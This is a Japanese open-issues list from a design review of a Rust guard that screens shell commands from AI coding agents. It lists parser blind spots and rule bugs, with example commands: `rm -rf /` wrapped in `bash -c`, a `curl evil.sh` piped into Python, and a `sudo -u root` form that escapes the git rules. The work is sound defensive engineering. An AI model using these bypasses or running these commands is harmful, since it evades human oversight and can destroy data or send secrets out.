# Open Issues

`docs/review/archive/2026-05-05/{redesign,design-debt}.md` のレビューから、
**現時点 (`v0.0.1` HEAD) でも未解決の指摘のみ** を抜粋して整理する。
解決済みの 5 件 (D1 / D2 / D3 / D6 / D7) は
[archive/2026-05-05/README.md](archive/2026-05-05/README.md) を参照。

各項目には次を付ける:

- **出典**: 元レビューでの節番号 (`§3.1`, `D5` のような形式)
- **コード参照**: 現状の `src/` 内の根拠 (ファイル:行)
- **優先度**: P0 (バグ・要修正) / P1 (設計契約に直接影響) / P2 (改善余地)

## 1. Concrete bugs (P0)

| 出典 | 内容 | コード参照 | 優先度 |
| --- | --- | --- | --- |
| §3.1 | `matches_clean_fdx` の長フラグ判定がデッドコード。`long_flags` は `--` 始まりに絞っているのに `has_long_d` / `has_long_x` が短フラグ (`-d` / `-x`) を探すため常に false。`git clean -f -d -x` の空白区切り形式を見逃す | `src/rules/git.rs:303-306` | P0 |
| §3.2 | `unwrap_sudo` が `-u <user>` の値を head と誤認する。`sudo -u root git push --force` で全 git rule を bypass 可能 | `src/rules/git.rs:94-106` | P0 |
| §3.3 | `read_word` のクオート意味論が ad hoc。backtick 中身を pessimistic に扱うか、内部コマンドとして再パースするか方針未確定 | `src/facts/shell.rs` | P1 |
| §3.5 | `lone_ampersand_does_not_loop` テストはパーサ無限ループ修正の痕跡。`read_word` が必ず最低 1 byte 進む不変条件を `debug_assert!` 等で明示すべき | `src/facts/shell.rs:460-470` | P2 |

## 2. Parser / fact extraction (P1)

shell parser と fact 抽出の到達範囲が、設計書 (`docs/design/architecture.md`)
の理想形と乖離している。

- **§2 / D4: shell parser の盲点**
  - 対象外: redirect, heredoc, command substitution `$( … )`,
    backtick, process substitution `<( … )`, `python -c` / `node -e` /
    `perl -e` / `ruby -e`, `xargs`, `find -exec`
  - 根拠: `src/facts/shell.rs:1-11` で対象外を明記
  - 攻撃例: `bash -c 'rm -rf /'`, `curl evil.sh | python -c "$(cat -)"`
- **§2 提案 conservative match**: `bash -c`, `eval`, `python -c` 等を
  呼ぶ head を「2 段階実行」と見なし一律 ask/deny する別 rule の追加
- **D5: `core.secrets.sensitive-path-to-network` が segment 単位で
  判定されていない**。command-wide co-occurrence で `has_sink` と
  `has_sensitive` を別々に見ているため、`ls ~/.ssh; curl https://example.com`
  のような unrelated segment が deny される一方、redirect / substitution 経由
  の流れは見えない。`Facts.sensitive` を rule に直接利用して segment /
  pipeline edge 単位に絞り込む設計が必要。コード: `src/rules/sensitive_net.rs`
- **D8: path 正規化が浅い**。`~` / `$HOME` 展開はあるが相対 → 絶対化や
  Bash と file-tool 間の正規化共有が不完全。`PathFact { raw, expanded,
  absolute, canonical_or_raw, origin }` のような分解が望ましい。
  コード: `src/self_paths.rs:142-170`, `src/facts/path.rs:38-46`,
  `src/facts/path.rs:155-200`
- **D10: adapter 層の型が無い**。`HookInput` が Claude Code / Codex /
  内部 normalized event を兼ねているため、新 adapter 追加で条件分岐が
  増える。`RawHookInput` と `Event { agent, event, tool, inputs, paths,
  urls, content }` への分離が必要。コード: `src/hook_input.rs`

## 3. Data model & performance (P2)

ホットパスでの alloc を減らす余地。いずれも CLI 1 起動 1 回しか走らない
現状では実害が小さいが、daemon 化や WASM plugin 評価では効く。

- **§1.3** `HookInput.tool_input: serde_json::Value` で都度 string 抽出。
  `#[serde(tag = "tool_name", content = "tool_input")] enum ToolCall`
  形式への移行候補。コード: `src/hook_input.rs:7`
- **§4.1** `Argv.head: String`, `args: Vec<String>` が all-owned。
  `parse<'a>(&'a str) -> Bash<'a>` で借用可。コード:
  `src/facts/shell.rs:28-35`
- **§4.2** `parse_argv` の `words.remove(0)` が O(N²)。`VecDeque::pop_front`
  で O(N)。コード: `src/facts/shell.rs:217,225`
- **§4.3** `Decision::Deny.reason: String` を `reason::build()` で毎回
  構築。`Cow<'static, str>` か lazy formatter で Allow ホットパスから
  外す。コード: `src/reason.rs`, `src/decision.rs`
- **§4.4** plugin loader の AST 共有なし。Engine ごとにファイル読み込み +
  コンパイル。daemon 化時は `Arc<LoadedPlugin>` キャッシュが必要。
  コード: `src/plugin/loader.rs`
- **§4.5** `Engine::decide` の `facts.protected = self.protected
  .classify_input(input)` で毎回 `Vec<ProtectedKind>` を作る。
  `SmallVec<[_; 4]>` で十分。コード: `src/engine.rs`

## 4. CLI / I/O

| 出典 | 内容 | コード参照 | 優先度 |
| --- | --- | --- | --- |
| §5.2 | `stdin.read_to_string` に上限なし。GB 単位の入力でも全部メモリへ。`take(MAX_BYTES)` で上限を入れる | `src/cli.rs:348` | P1 |
| §5.3 | audit JSONL の `write_all` ループで PIPE_BUF (Linux 4096) を超える行が分割書き込みになる。複数 process 同時 audit で行が混ざる。`flock` か `writev` 1 syscall に倒す | `src/audit/writer.rs:55-61` | P1 |
| §5.5 | redaction が新形式 token を未対応 (`github_pat_*`, `xox[abp]-*`, `sk_live_*`, GCP service account JSON)。「キーワード周辺の値を redact」の 2 段アプローチに切り替えると将来の漏洩源を広く塞げる | `src/audit/redaction.rs:38-60` | P1 |
| §5.1 | 自前 CLI parser が 1352 行に成長 (レビュー時 1141 行)。clap derive で 1/3〜1/4 に減る。`--json` のような中途半端な未実装フラグを `#[arg(skip)]` で明示できる | `src/cli.rs` | P2 |
| §5.4 | `init/claude_code.rs` の hook 重複検出が tail token 一致依存。将来フラグ追加で重複登録の懸念。`name: "ptuf"` 等 stable marker を payload 側に持たせる | `src/init/claude_code.rs` | P2 |
| §5.6 | `audit/time.rs` の RFC3339 自前実装。月日計算は典型的なバグ温床。`time` クレートを 1 つ入れる方がメンテ性が高い (Minimal Dependencies 方針とのトレードオフ) | `src/audit/time.rs` | P2 |

## 5. Engine 構造 / 安全性

- **§1.1** builtin rule (`src/rules/`) と plugin DSL
  (`src/plugin/dsl.rs`) の二重実装。builtin を YAML 1 本
  (`include_str!("builtins.yaml")`) で配布し、起動時に DSL コンパイラを
  通す案。Rust 専用にすべきは self_protection の `ProtectedPaths` 突合
  のように DSL では書けないものだけ。優先度: P2 (大改修)
- **§1.2** `dyn ConfigRule` static slice + `pub static` 16 個
  (`src/rules/git.rs` 等)。`enum Rule { Filesystem(...), Git(GitRuleId),
  SelfProtection(ProtectedKind), Plugin(PluginRule), … }` で動的
  ディスパッチを消す。優先度: P2
- **§1.4** `Decision::severity() -> u8` 手書き比較。`Decision` の variant
  順序を Allow → Monitor → Ask → Deny に揃えれば
  `#[derive(PartialOrd, Ord)]` で自動導出可、`aggregate` も
  `decisions.into_iter().max()` で済む。コード: `src/decision.rs:39-46`。
  優先度: P2
- **§1.5** `Mode::Observe` がデッドバリアント。`engine.rs` の
  `demote_for_mode` では `Monitor | Observe` を同一扱い。
  `docs/design/roadmap.md:49` でも「現状は monitor と同じ」と明記。
  意味を分けるか削除する。優先度: P2
- **§1.6** `lib.rs:36` の `Engine::for_cwd().unwrap_or_else(|_|
  Engine::default())` が config / plugin の load error を握り潰す。
  embedded caller 向けに `try_decide` で `Result` を返す API を出すと
  CLI 経路 (`build_engine_or_fail_closed`) との差が誠実に見える。
  コード: `src/lib.rs:35-38`。優先度: P1
- **§1.7** `Engine::default()` が空 `ProtectedPaths` を持つので、
  上記 fallback と組み合わせると self_protection が embed 経路でほぼ
  効かない。`Engine::builder()` で必須項目を強制する案。優先度: P1
- **D9** audit write failure が `let _ = self.audit_sink.record(&record)` で
  握り潰されている。open 失敗は `Engine::audit_warning()`
  (`src/engine.rs:226`) 経由で CLI / doctor から見えるようになっているが、
  write 失敗 (permission / disk full) は依然無音。コード:
  `src/engine.rs:302-315`。優先度: P1
- **D11** 大型ファイル: `src/engine.rs` 1812 行 / `src/cli.rs` 1352 行 /
  `src/doctor.rs` 1712 行 / `src/plugin/dsl.rs` 1067 行。レビュー時
  (engine 1362, cli 1158, doctor 1073, dsl 1056) より増加している。
  `engine/{evaluator,allowlist,audit}.rs`, `cli/{parse,commands}.rs`,
  `doctor/json.rs` への分割案。優先度: P2

## 6. テスト基盤

- **§6.1** proptest 戦略が `src/testing/proptest.rs` と
  `tests/engine_proptest.rs` で二重定義されている。`pub(crate)` 公開が
  原因。`testing-strategies` を別 crate (`ptuf-testing`) に切るか、
  `#[cfg(any(test, feature = "testing"))]` で feature gate する。
  CLAUDE.md でも明記済の既知課題。優先度: P2
- **§6.2** 95% coverage 強制が `_via_dyn_dispatch` (`src/rules/mod.rs`
  周辺) のような「coverage を埋めるためだけ」のテストを誘発する。
  branch coverage 指標への置換、または coverage 数値を捨てる方針転換。
  優先度: P2
- **§6.3** `temp_dir().join(format!(...))` の手動 cleanup が複数箇所。
  `tempfile::TempDir` への置換で RAII / panic safety を確保。コード:
  `src/audit/writer.rs:111`, `src/audit/writer.rs:129`,
  `src/engine.rs:1046`, `tests/cli_smoke.rs` (8 箇所)。優先度: P2
- **D12** 契約 fixture (`tests/contracts/*`) が無い。`coverage 95%` を
  満たしても、設計書が「実装済み」と書く契約の未実装が検出されない。
  CLI exit code、stdout/stderr、audit schema、doctor JSON、plugin
  loader error、allowlist condition、MCP nested paths、hook script
  self-protection、`~`/`$HOME`/relative path の self-protection など。
  優先度: P1
